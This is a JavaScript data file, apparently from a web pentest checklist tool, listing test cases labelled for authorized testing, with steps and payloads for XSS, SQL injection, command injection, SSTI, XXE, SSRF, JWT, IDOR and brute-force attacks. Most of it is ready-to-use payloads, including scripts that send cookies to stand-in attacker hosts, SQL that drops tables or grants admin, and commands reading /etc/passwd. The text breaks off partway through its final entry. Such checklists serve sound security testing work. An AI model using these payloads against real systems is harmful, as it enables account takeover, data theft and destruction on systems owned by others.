if (localStorage.getItem('thenawabx_theme') === 'dark') {
    document.body.classList.add('dark-mode');
}

const allTestCases = [
    {
        id: "xss_payload_collection_extended",
        category: "XSS",
        title: "XSS Payload Collection [Authorized Testing]",
        where: "HTML, Attribute, URL, JavaScript, SVG, and Template Contexts",
        severity: "High",
        steps: [
            "Use a disposable test account and an authorized XSS test field.",
            "Send one harmless test payload at a time in the correct input context.",
            "Confirm only controlled reflection or execution and record the affected context."
        ],
        payloads: String.raw`
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.cookie)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open toggle=alert(1)>
<script>alert(1)<\/script>
" onfocus=alert(1) autofocus="
' onmouseover=alert(1) '
" autofocus onfocus=alert(1) x="
" onblur=alert(1) autofocus="
javascript:alert(1)
" href="javascript:alert(1)"
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<svg onload=confirm\`1\`>
<img src=x onerror=prompt(document.domain)>
<svg/onload=eval(atob('YWxlcnQoMSk='))>
<svg onload=a=alert,a(1)>
<svg><script>alert(1)<\/script></svg>
<svg><style onload=alert(1)></style></svg>
<xss id=x onfocus=alert(1) tabindex=1>#x
<animate onbegin=alert(1) attributeName=x>
<math><mtext><option><a href="javascript:alert(1)">click
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
'-alert(1)-'
';alert(1);//
};alert(1);//
\x27;alert(1)//
"-alert(1)-"
\${alert(1)}
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{_openBlock.constructor('alert(1)')()}}
\${alert(1)}
%3Csvg%20onload%3Dalert%281%29%3E
%22%20onfocus%3Dalert%281%29%20autofocus%3D%22
%27%3Balert%281%29%3B%2F%2F
%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
<a href="jav&#x09;ascript:alert(1)">Click</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">Click</a>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<script>\u0061\u006c\u0065\u0072\u0074(1)<\/script>
<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')<\/script>
&#x3C;&#x73;&#x76;&#x67;&#x20;&#x6F;&#x6E;&#x6C;&#x6F;&#x61;&#x64;&#x3D;&#x61;&#x6C;&#x65&#x72&#x74;&#x28;&#x31;&#x29;&#x3E;
<iframe/src=javascript:alert(1)>
<img src=x onerror=prompt\`1\`>
<script>alert\`document.domain\`<\/script>
<script>alert(String.fromCharCode(88,83,83))<\/script>
" autofocus/onfocus=alert(1)//
' accesskey='x' onclick='alert(1)
<svg onload=window['alert'](1)>
<svg onload=top['al'+'ert'](1)>
<svg onload=eval('al'+'ert(1)')>
" autofocus/onfocus=confirm\`1\`//
"><svg onload=alert(1)>
'><img src=x onerror=alert(1)>
"-confirm\`1\`-"
'-confirm\`1\`-'
\${alert(document.domain)}
<img/src=x/onerror=prompt\`document.domain\`>
<svg/onload=a=alert,a\`1\`>
<iframe/src=javascript:alert\`1\`>
"><img src=x onerror=alert(1)>
"><script>alert(1)<\/script>
' onfocus=alert(1) autofocus='
javascript:alert(document.domain)
\";alert(1);//
\${confirm\`1\`}
javascript:"/*\`/*\`*/cookie=1///*"/*\`/*\`/\`/*\`*/alert(1)//
jaVasCript:/*-/*\`/*\\\`/*'/*"/*%0D%0A%0D%0Aalert(1)//"*/
'"><svg/onload=alert(1)>
<script src=//xss.report/c/yourid><\/script>
""><script src=https://your-callback-url.com><\/script>
<img src=x onerror=this.src='https://your-callback-url.com?c='+document.cookie>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"><\/script>
<script src="https://www.google.com/recaptcha/api.js?onload=alert&render=explicit"><\/script>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<math><style><img src=x onerror=alert(1)></style></math>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<form><button formdata="javascript:alert(1)">CLICK</button></form>
<a href="javascript&colon;alert(1)">Click</a>
<svg><animate href="#x" attributeName="href" values="javascript:alert(1)" /><a id="x"><rect width="100" height="100" /></a>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x" /></svg>
"><input/onfocus=location='javascript:alert(1)' autofocus>
<isindex type=image action=javascript:alert(1)>
<table background="javascript:alert(1)"></table>
<div style="background-image: url(javascript:alert(1))">
<x ng-app>{{constructor.constructor('alert(1)')()}}</x>
<div v-html="'<img src=x onerror=alert(1)>'"></div>
"?><script>alert(1)<\/script>
<!--#exec cmd="/bin/echo '<script>alert(1)<\/script>'"-->
Object.prototype.innerHTML='<img src=x onerror=alert(1)>'
__proto__[innerHTML]=<img src=x onerror=alert(1)>
__proto__[v-if]=alert(1)
__proto__[srcdoc]=<script>alert(1)<\/script>
javascript:alert\`1\`
javascript:eval(atob('YWxlcnQoMSk='))
data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
blob:https://target.com/00000000-0000-0000-0000-000000000000
<svg/onload=fetch('//your-server/?c='+document.cookie)>
<img/src/onerror=top['al'+'ert'](1)>
<svg/onload=window['alert'](document.domain)>
<svg/onload=eval('al'+'ert\`1\`')>
<svg/onload=setTimeout('alert(1)',0)>
<slot name=x onload=alert(1)></slot>
<menuitem icon="javascript:alert(1)">
<portal src="javascript:alert(1)"></portal>
<xss style="behavior:url(#default#time2)" end="0" onend="alert(1)">
" autofocus onfocus=alert\`1\` //
' autofocus onfocus=alert\`1\` //
" onfocus=eval(atob('YWxlcnQoMSk=')) autofocus="
" accesskey=x onclick=alert(1) //
<script>\u0061\u006c\u0065\u0072\u0074(1)<\/script>
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
%253Csvg%2520onload%253Dalert%25281%2529%253E
`.trim().split('\n'),
        expected: "The application should safely encode or reject the input and prevent script execution in the tested context."
    },
    {
        id: "sqli_payload_collection_extended",
        category: "SQLi",
        title: "SQL Injection Payload Collection [Authorized Testing]",
        where: "SQL Query Parameters, Login Fields, JSON Bodies, and Headers",
        severity: "High",
        steps: [
            "Use a disposable test account and an authorized SQLi test endpoint.",
            "Send one payload at a time in the selected parameter and compare it with a harmless control value.",
            "Record only response differences, timing changes, or controlled test data in the assessment notes."
        ],
        payloads: `
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--
admin'--
admin' #
' OR TRUE--
') OR ('1'='1
") OR ("1"="1
'/**/OR/**/1=1--
"/**/OR/**/1=1--
'/*%00*/OR/*%00*/1=1--
'%0aOR%0a1=1--
'%0dOR%0d1=1--
'%09OR%091=1--
'/*!50000OR*//*!500001=1*/--
' UnIoN SeLeCt 1,2,3--
' UNunionION SEselectLECT 1,2,3--
' %00' OR 1=1--
' OR 1=1%00
' OR 1=1%23
' OR 1=1-- -
'%20OR%201=1--
'%a0OR%a01=1--
' %26%26 1=1--
' %7c%7c 1=1--
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 5--
' ORDER BY 10--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
' UNION SELECT 1,2,3,4,5--
' UNION SELECT 1,2,3,4,5,6--
' UNION SELECT 1,2,3,4,5,6,7--
' UNION SELECT 1,2,3,4,5,6,7,8--
" UNION SELECT NULL,NULL--
" UNION SELECT 1,2,3--
" UNION SELECT 1,2,3,4--
' UNION ALL SELECT 1,2,3--
' UNION ALL SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3 FROM (SELECT 1)a--
' UNION SELECT 1,2,3 FROM (SELECT 1,2)a--
' UNION SELECT 1,2,3 FROM (SELECT 1,2,3)a--
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND 1=updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
' AND 1=extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
' AND 1=convert(int, (select @@version))--
' AND 1=cast((select user()) as int)--
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e) x FROM information_schema.tables GROUP BY x) a)--
' AND (SELECT 1)=1--
' AND (SELECT 1)=0--
' OR 1=1#
' OR 1=1/*
' OR 1=1-- 
'/**/UNION/**/SELECT/**/1,2,3--
'/*!50000UNION*//*!50000SELECT*/1,2,3--
'/**/AND/**/1=1--
'/**/AND/**/1=0--
'/**/OR/**/1=0--
"/**/UNION/**/SELECT/**/1,2,3--
' OR 1=1%0a
' OR 1=1%0d
' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT user(),database(),@@version--
' UNION SELECT null,@@version,null--
' UNION SELECT null,db_name(),null--
' UNION SELECT null,name,null FROM sys.databases--
' UNION SELECT null,table_name,null FROM information_schema.tables--
' AND 1=(SELECT COUNT(*) FROM tablename)--
' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
' AND 1=(SELECT COUNT(*) FROM information_schema.columns)--
') OR ('a'='a
admin' ) OR ('1'='1
' OR 1=1 GROUP BY 1--
' OR 1=1 GROUP BY 1,2--
' OR 1=1 GROUP BY 1,2,3--
' AND EXISTS(SELECT * FROM users)--
' AND EXISTS(SELECT * FROM information_schema.tables)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 0,1) AS INT)--
' AND 1=(SELECT user())--
' AND 1=(SELECT database())--
' AND 1=(SELECT version())--
" OR 1=1 #
' OR 1=1 %09
' OR 1=1 %0b
' OR 1=1 %0c
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,sqlite_version(),NULL--
' UNION SELECT NULL,banner FROM v$version--
' UNION SELECT NULL,table_name FROM all_tables--
(CASE WHEN (1=1) THEN 1 ELSE 0 END)
1 DESC, (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),0x7e)x FROM information_schema.tables GROUP BY x)a)
'}]} ,"a":1}/*
"}},"$or":[{"a":1}]}/*
' OR 1=1 JSON--
' || '1'=='1
' || 1==1//
{"$gt": ""}
{"$ne": null}
{"$regex": ".*"}
' OR 'a'='a'
" OR "a"="a"
' XOR 1=1--
' XOR 1=0--
" XOR 1=1--
' XOR (SELECT 1)=1--
' XOR (SELECT 1)=0--
' XOR 'a'='a
' XOR 'a'='b
1' XOR '1'='1
1' XOR '1'='2
' ^ 1=1--
' ^ 1=0--
'; DROP TABLE users;--
'; DECLARE @x AS VARCHAR(100);--
test' AND 1=1--
' AND SLEEP(5)--
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
'; SELECT pg_sleep(5)--
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
`.trim().split('\n'),
        expected: "The application should safely handle test input, prevent query manipulation, and return only the authorized result without database errors or unintended data."
    },
    {
        id: "login_sqli",
        category: "SQLi",
        title: "SQL Injection (In-Band & Auth Bypass) [Login Page]",
        where: "Login Page",
        severity: "Critical",
        steps: [
            "Navigate to the login page and locate the username input field.",
            "Enter an SQL payload (e.g., admin' --) into the username field and leave the password field blank or random.",
            "Click the submit button and intercept the request in Burp Suite to verify if the backend evaluates the query as true and grants access."
        ],
        payloads: [
            "admin' --",
            "' OR '1'='1' #",
            "admin' or '1'='1' limit 1 --"
        ],
        expected: "Successful authentication bypass allowing access without valid credentials."
    },
    {
        id: "login_blind_sqli",
        category: "SQLi",
        title: "Blind & Time-Based SQLi [Login Page]",
        where: "Login Page",
        severity: "Critical",
        steps: [
            "Navigate to the login page and intercept the login request using Burp Suite.",
            "Send the request to Burp Repeater or Intruder and inject a time-delay payload (e.g., SLEEP) into the username or password parameter.",
            "Send the request and measure the server response delay time to check if the database evaluates the conditional sleep command."
        ],
        payloads: [
            "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "admin' AND 1=IF(2>1,SLEEP(5),0)--"
        ],
        expected: "A noticeable server response delay confirming time-based SQL injection."
    },
    {
        id: "login_reflected_xss",
        category: "XSS",
        title: "Reflected Cross-Site Scripting (XSS) [Login Page]",
        where: "Login Page",
        severity: "Medium",
        steps: [
            "Navigate to the login page and enter an HTML/JavaScript payload into the username input field.",
            "Submit the form and capture the response to check if the invalid username is reflected unescaped inside the error message or page DOM.",
            "Verify whether the script executes within the browser context."
        ],
        payloads: [
            "&lt;script&gt;alert(document.domain)&lt;/script&gt;",
            "admin\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
            "&lt;img src=x onerror=alert(document.cookie)&gt;"
        ],
        expected: "Execution of a pop-up alert box proving Reflected XSS."
    },
    {
        id: "login_auth_bypass",
        category: "Auth & Session",
        title: "Authentication Bypass & Brute Force / Credential Stuffing [Login Page]",
        where: "Login Page",
        severity: "Critical",
        steps: [
            "Capture the login request using Burp Suite and send it to Burp Intruder.",
            "Load a dictionary payload list containing common username and password combinations into the respective fields.",
            "Run the attack at high speed and monitor the response status codes to check if rate limiting or account locking mechanisms are missing."
        ],
        payloads: [
            "admin / password123",
            "test / 123456",
            "root / admin"
        ],
        expected: "Ability to perform thousands of login attempts without triggering account lockout or rate limiting."
    },
    {
        id: "login_weak_password",
        category: "Auth & Session",
        title: "Weak Password Policy & Missing Account Lockout [Login Page]",
        where: "Login Page",
        severity: "Medium",
        steps: [
            "Attempt logging into the target account using incorrect credentials multiple times consecutively.",
            "Inspect the application responses to verify if account lockout, CAPTCHA, or IP blocking triggers after consecutive failed attempts."
        ],
        payloads: [
            "100+ rapid sequential failed login attempts",
            "Automated credential guessing via Burp Intruder"
        ],
        expected: "Absence of account lockout or rate limiting allowing brute-force account compromise."
    },
    {
        id: "login_open_redirect",
        category: "Open Redirect",
        title: "Open Redirection via Login Return URL [Login Page]",
        where: "Login Page",
        severity: "Medium",
        steps: [
            "Locate a login URL containing a return or redirect parameter (e.g., /login?next=https://trusted.com).",
            "Modify the redirect parameter value to point to an external malicious domain (e.g., https://evil.com).",
            "Complete a successful login using the modified URL and check if the application redirects to the external domain."
        ],
        payloads: [
            "/login?redirect=https://evil.com",
            "/login?next=//evil.com",
            "/login?url=javascript:alert(1)"
        ],
        expected: "Successful redirection to an external malicious URL following login."
    },
    {
        id: "login_rate_limiting",
        category: "Rate Limiting",
        title: "Lack of Rate Limiting & CAPTCHA [Login Page]",
        where: "Login Page",
        severity: "Medium",
        steps: [
            "Capture a login request in Burp Suite and send it to Burp Intruder.",
            "Configure a payload list with 50+ password attempts targeting a single user account.",
            "Execute the attack without throttling and check if the application returns 429 Too Many Requests or enforces CAPTCHA."
        ],
        payloads: [
            "High-frequency automated password guessing on /login",
            "Absence of 429 Too Many Requests response headers"
        ],
        expected: "Unlimited login requests processed successfully without throttling or CAPTCHA."
    },
    {
        id: "url_blind_sqli",
        category: "SQLi",
        title: "Blind & Time-Based SQL Injection [URL Parameters & Headers]",
        where: "URL Parameters & Headers",
        severity: "Critical",
        steps: [
            "Identify query parameters in the URL (e.g., ?id=1) or customizable HTTP headers (User-Agent, Cookie, Referer).",
            "Send the request to Burp Repeater or Intruder.",
            "Inject boolean or time-delay payloads (like SLEEP) into the target parameter or header field and forward the request.",
            "Measure the server response delay to confirm execution."
        ],
        payloads: [
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND 1=1 --",
            "X-Forwarded-For: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ],
        expected: "A noticeable server delay or response change confirming Blind/Time-based SQL injection."
    },
    {
        id: "url_header_injection",
        category: "RCE & Injection",
        title: "Header Injection (X-Forwarded-For and Related Headers) [URL Parameters & Headers]",
        where: "URL Parameters & Headers",
        severity: "High",
        steps: [
            "Capture a web request using Burp Suite and modify custom HTTP headers such as `X-Forwarded-For`, `Referer`, or `User-Agent`.",
            "Insert test strings, payloads, or XSS scripts into these header values and forward the request.",
            "Check application logs, error pages, or admin panels to see if the header values are processed unsafely."
        ],
        payloads: [
            "X-Forwarded-For: &lt;script&gt;alert(1)&lt;/script&gt;",
            "Referer: ' OR 1=1--"
        ],
        expected: "Unsafe reflection or execution of modified HTTP header values."
    },
    {
        id: "url_reflected_xss",
        category: "XSS",
        title: "Reflected Cross-Site Scripting (XSS) [URL Parameters & Headers]",
        where: "URL Parameters & Headers",
        severity: "High",
        steps: [
            "Identify input points via URL query parameters or error message fields.",
            "Input HTML/JavaScript script payloads into the parameter and send the request.",
            "Inspect the response page in the browser to check if the script executes instead of rendering as plain text."
        ],
        payloads: [
            "&lt;script&gt;alert(document.domain)&lt;/script&gt;",
            "&lt;img src=x onerror=alert(1)&gt;"
        ],
        expected: "Pop-up alert box execution in the browser proving Reflected XSS."
    },
    {
        id: "profile_second_sqli",
        category: "SQLi",
        title: "Second-Order SQL Injection [Profile Form & Feedback Box]",
        where: "Profile Form & Feedback Box",
        severity: "Critical",
        steps: [
            "Enter an SQL payload into an input field that stores data persistently (e.g., user bio, full name, feedback form).",
            "Submit the form and verify that the data is saved successfully without an immediate database error.",
            "Navigate to a secondary page or admin panel where this stored user data is retrieved and processed inside a backend query."
        ],
        payloads: [
            "admin'--",
            "test'; DROP TABLE logs; --",
            "john'; UPDATE users SET role='admin' WHERE username='john'--"
        ],
        expected: "Database errors or unintended actions resulting from unsafe usage of stored data in secondary queries."
    },
    {
        id: "profile_stored_xss",
        category: "XSS",
        title: "Stored Cross-Site Scripting (XSS) [Profile Form & Feedback Box]",
        where: "Profile Form & Feedback Box",
        severity: "Critical",
        steps: [
            "Locate an input field that permanently saves data on the server (e.g., profile settings, feedback box).",
            "Submit a script payload into the field and save the changes.",
            "Log in using a separate user or admin account and view the page where the saved data is rendered."
        ],
        payloads: [
            "&lt;script&gt;alert(document.cookie)&lt;/script&gt;",
            "&lt;img src=x onerror=alert(1)&gt;"
        ],
        expected: "Automatic script execution when viewing the stored profile or feedback data."
    },
    {
        id: "profile_mass_assignment",
        category: "IDOR & Access",
        title: "Mass Assignment / Parameter Pollution [Profile Form & Feedback Box]",
        where: "Profile Form & Feedback Box",
        severity: "Critical",
        steps: [
            "Capture the profile update request using Burp Suite.",
            "Inject restricted administrative parameters or properties into the JSON body (e.g., `\"role\": \"admin\"`).",
            "Forward the request and check if the backend binds the unvalidated properties."
        ],
        payloads: [
            "{\"username\": \"test\", \"role\": \"admin\"}",
            "{\"is_admin\": true}"
        ],
        expected: "Privilege escalation or unauthorized property modification via mass assignment."
    },
    {
        id: "checkout_price_manipulation",
        category: "Business Logic",
        title: "Price Manipulation & Negative Quantity Checkout [Checkout Form & Registration API]",
        where: "Checkout Form & Registration API",
        severity: "High",
        steps: [
            "Capture the checkout or cart update request in Burp Suite.",
            "Modify item prices, discounts, or set item quantities to negative numbers (e.g., quantity=-1).",
            "Forward the modified request to the server and check if the total payable amount updates incorrectly."
        ],
        payloads: [
            "price=0.01",
            "quantity=-1",
            "discount_percentage=100"
        ],
        expected: "Successful order creation with altered prices or negative total amounts."
    },
    {
        id: "search_oast_sqli",
        category: "SQLi",
        title: "Out-of-Band (OAST) SQL Injection [Search Bar & Profile Inputs]",
        where: "Search Bar & Profile Inputs",
        severity: "Critical",
        steps: [
            "Identify input parameters that interact with database queries without rendering direct output on the screen.",
            "Inject an OAST payload configured with your Burp Collaborator or external listener domain.",
            "Submit the request and monitor your external listener for incoming connections."
        ],
        payloads: [
            "1' AND LOAD_FILE(CONCAT('\\\\',version(),'.collaborator.site\\a'))--",
            "1'; EXEC master..xp_dirtree '\\\\collaborator.site\\a'--"
        ],
        expected: "Outbound DNS or HTTP requests from the target database server to your external listener."
    },
    {
        id: "comments_stored_xss",
        category: "XSS",
        title: "Stored Cross-Site Scripting (XSS) [Comments, Bio & Support Tickets]",
        where: "Comments, Bio & Support Tickets",
        severity: "Critical",
        steps: [
            "Submit a script payload into user comments, bio fields, or support ticket forms.",
            "Save the submission and log into the application using a different user or admin account.",
            "Navigate to the page displaying the comment or ticket to check for execution."
        ],
        payloads: [
            "&lt;script&gt;fetch('http://attacker.s/log?c='+document.cookie)&lt;/script&gt;",
            "&lt;body onload=alert(document.cookie)&gt;"
        ],
        expected: "Automatic script execution when viewing stored comments or support tickets."
    },
    {
        id: "comments_blind_xss",
        category: "XSS",
        title: "Blind XSS [Comments, Bio & Support Tickets]",
        where: "Comments, Bio & Support Tickets",
        severity: "Critical",
        steps: [
            "Submit a callback script payload into support tickets or feedback forms that are exclusively reviewed by staff/administrators.",
            "Monitor your external logging server for incoming requests."
        ],
        payloads: [
            "&lt;script src=http://attacker.com/bXss.js&gt;&lt;/script&gt;",
            "&lt;img src=http://attacker.com/log?cookie=\"+document.cookie&gt;"
        ],
        expected: "A callback request received on your external server when staff views the ticket."
    },
    {
        id: "dom_xss_hash",
        category: "XSS",
        title: "DOM-Based Cross-Site Scripting (DOM XSS) [URL Hash & PostMessage Handlers]",
        where: "URL Hash & PostMessage Handlers",
        severity: "High",
        steps: [
            "Inspect client-side JavaScript code to find insecure sources like location.hash or window.onmessage.",
            "Inject a payload string into the URL hash (#) or trigger it via a cross-origin postMessage event.",
            "Verify whether the script executes via client-side DOM manipulation."
        ],
        payloads: [
            "#'&gt;&lt;img src=x onerror=alert(document.domain)&gt;",
            "#javascript:alert(1)"
        ],
        expected: "Execution of script code via client-side DOM manipulation."
    },
    {
        id: "blog_stored_xss",
        category: "XSS",
        title: "Stored XSS [Blog & Forum Posts Editor]",
        where: "Blog & Forum Posts Editor",
        severity: "Critical",
        steps: [
            "Input script tags into blog articles or forum post content editors and publish the post.",
            "View the published article as another standard user."
        ],
        payloads: [
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            "&lt;svg onload=alert(document.cookie)&gt;"
        ],
        expected: "Stored XSS execution when viewing published blog posts."
    },
    {
        id: "file_converter_rce",
        category: "RCE & Injection",
        title: "OS Command Injection (RCE) [File Converter & Ping Utility Forms]",
        where: "File Converter & Ping Utility Forms",
        severity: "Critical",
        steps: [
            "Locate functionality that interacts with OS commands (e.g., ping tools, format converters).",
            "Inject command separators like semicolons (;), pipes (|), or backticks (`) followed by system commands into the input field.",
            "Submit the form and check the output for command execution results."
        ],
        payloads: [
            "127.0.0.1; whoami",
            "127.0.0.1 && cat /etc/passwd",
            "`id`"
        ],
        expected: "Successful execution and output of operating system commands."
    },
    {
        id: "email_ssti",
        category: "RCE & Injection",
        title: "Server-Side Template Injection (SSTI) [Email & Welcome Templates]",
        where: "Email & Welcome Templates",
        severity: "Critical",
        steps: [
            "Identify input fields processed dynamically inside server email or welcome templates (e.g., Jinja2, Twig).",
            "Input template expression payloads (like math evaluations) and submit the form.",
            "Check if the server evaluates and returns the computed result."
        ],
        payloads: [
            "{{7*7}}",
            "${7*7}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
        ],
        expected: "Evaluation of math expressions or execution of system code."
    },
    {
        id: "xml_upload_xxe",
        category: "RCE & Injection",
        title: "XML External Entity (XXE) Injection [XML File & SVG Upload Forms]",
        where: "XML File & SVG Upload Forms",
        severity: "Critical",
        steps: [
            "Prepare a malicious XML or SVG file containing DOCTYPE declarations pointing to internal server files.",
            "Upload the file through the application upload portal and submit."
        ],
        payloads: [
            "&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;"
        ],
        expected: "Leaked internal file contents displayed in the response confirming XXE."
    },
    {
        id: "auth_header_jwt_confusion",
        category: "Auth & Session",
        title: "JWT Algorithm Confusion & None Attack [Authorization Header]",
        where: "Authorization Header",
        severity: "High",
        steps: [
            "Capture a request containing a JWT token in Burp Suite.",
            "Modify the algorithm parameter 'alg' in the header to 'none' or alter the signing key, then forward the request."
        ],
        payloads: [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjF9.invalid_signature"
        ],
        expected: "Server accepting unverified tokens or tokens with 'none' algorithm."
    },
    {
        id: "password_reset_host_header",
        category: "Auth & Session",
        title: "Host Header Poisoning (Password Reset Poisoning) [Password Reset Form]",
        where: "Password Reset Form",
        severity: "High",
        steps: [
            "Capture a password reset request in Burp Suite.",
            "Modify the `Host` or `X-Forwarded-Host` HTTP header to point to your malicious domain and submit the request."
        ],
        payloads: [
            "Host: attacker.com",
            "X-Forwarded-Host: attacker.com"
        ],
        expected: "Password reset links generated with the poisoned domain pointing to external servers."
    },
    {
        id: "mfa_verification_bypass",
        category: "Auth & Session",
        title: "Multi-Factor Authentication (MFA) Bypass via Response Manipulation [MFA Verification Step]",
        where: "MFA Verification Step",
        severity: "Critical",
        steps: [
            "Initiate login and capture the OTP/MFA code verification response in Burp Suite.",
            "Modify the response status code to `200 OK` or alter the JSON success flags to true, then forward it to the browser."
        ],
        payloads: [
            "{\"success\": true, \"verified\": true}",
            "HTTP/1.1 200 OK"
        ],
        expected: "Bypassing the MFA verification flow via response manipulation."
    },
    {
        id: "user_profile_idor",
        category: "IDOR & Access",
        title: "Insecure Direct Object Reference (IDOR) [User Profile & Account Settings]",
        where: "User Profile & Account Settings",
        severity: "Critical",
        steps: [
            "Log into your account and navigate to your profile settings page.",
            "Capture the request in Burp Suite and modify the user ID parameter (e.g., changing id=101 to id=102) and forward it."
        ],
        payloads: [
            "id=101 to id=102",
            "user_id=42 to user_id=43"
        ],
        expected: "Unauthorized access to private profile data of other users."
    },
    {
        id: "rest_api_bola",
        category: "IDOR & Access",
        title: "Broken Object Level Authorization (BOLA) [REST API Endpoints (/api/v1/orders)]",
        where: "REST API Endpoints (/api/v1/orders)",
        severity: "Critical",
        steps: [
            "Log into the application and capture an API request fetching resource data (e.g., /api/v1/orders/5001).",
            "Modify the resource ID number to reference another user's record and forward the request."
        ],
        payloads: [
            "/api/v1/orders/5001",
            "/api/v1/users/2/documents"
        ],
        expected: "Unauthorized access or modification of other users' API records."
    },
    {
        id: "admin_urls_access_control",
        category: "IDOR & Access",
        title: "Function Level Access Control Bypass [Admin URLs & API Routes]",
        where: "Admin URLs & API Routes",
        severity: "High",
        steps: [
            "Log into the application using a standard low-privilege user account.",
            "Attempt to browse directly to administrative URLs or API endpoints (e.g., /admin/panel)."
        ],
        payloads: [
            "/admin/panel",
            "/api/v1/admin/delete-user"
        ],
        expected: "Unrestricted access and execution of administrative functions."
    },
    {
        id: "user_profile_update_idor",
        category: "IDOR & Access",
        title: "Insecure Direct Object Reference (IDOR) [User Profile Update API]",
        where: "User Profile Update API",
        severity: "Critical",
        steps: [
            "Capture a profile update request in Burp Suite.",
            "Modify the target user ID reference in the endpoint path or body to point to another account and forward the request."
        ],
        payloads: [
            "PUT /api/v1/user/102/profile"
        ],
        expected: "Successful unauthorized profile updates on other user accounts."
    },
    {
        id: "state_changing_csrf",
        category: "CSRF",
        title: "CSRF [State Changing API Endpoints]",
        where: "State Changing API Endpoints",
        severity: "High",
        steps: [
            "Identify state-changing API endpoints or forms that lack robust anti-CSRF token verification.",
            "Construct a malicious HTML PoC form targeting the endpoint and host it externally to test cross-origin submission."
        ],
        payloads: [
            "Cross-origin POST request without custom request headers or tokens"
        ],
        expected: "Unauthorized execution of state changes via third-party sites."
    },
    {
        id: "webhook_ssrf",
        category: "SSRF",
        title: "Server-Side Request Forgery (SSRF) [Webhook & Avatar URL Fetcher]",
        where: "Webhook & Avatar URL Fetcher",
        severity: "Critical",
        steps: [
            "Locate webhook configuration or profile picture URL fetcher inputs.",
            "Supply internal loopback addresses (127.0.0.1) or cloud metadata IP addresses and submit the request."
        ],
        payloads: [
            "http://127.0.0.1:80/",
            "http://169.254.169.254/latest/meta-data/"
        ],
        expected: "Exposing internal ports or cloud metadata information."
    },
    {
        id: "avatar_upload_rce",
        category: "File Upload",
        title: "Unrestricted File Upload to RCE [Avatar & Document Upload Form]",
        where: "Avatar & Document Upload Form",
        severity: "Critical",
        steps: [
            "Attempt uploading an executable web script disguised as an image (e.g., shell.jpg.php or shell.php) through the file upload form.",
            "Try to access the uploaded file path on the server to check for execution."
        ],
        payloads: [
            "shell.php",
            "shell.jpg.php"
        ],
        expected: "Successful code execution via the uploaded file."
    },
    {
        id: "avatar_upload_path_traversal",
        category: "File Upload",
        title: "Path Traversal [Avatar & Document Upload Form]",
        where: "Avatar & Document Upload Form",
        severity: "High",
        steps: [
            "Capture a file upload request in Burp Suite.",
            "Modify the filename parameter to include path traversal sequences (e.g., `../../../var/www/html/shell.php`) and forward the request."
        ],
        payloads: [
            "../../../var/www/html/exploit.php"
        ],
        expected: "Writing files outside the intended upload directory."
    },
    {
        id: "ecommerce_price_manipulation",
        category: "Business Logic",
        title: "Price Manipulation & Negative Quantity Checkout [E-Commerce Cart & Checkout]",
        where: "E-Commerce Cart & Checkout",
        severity: "High",
        steps: [
            "Add items to the cart and capture the checkout request in Burp Suite.",
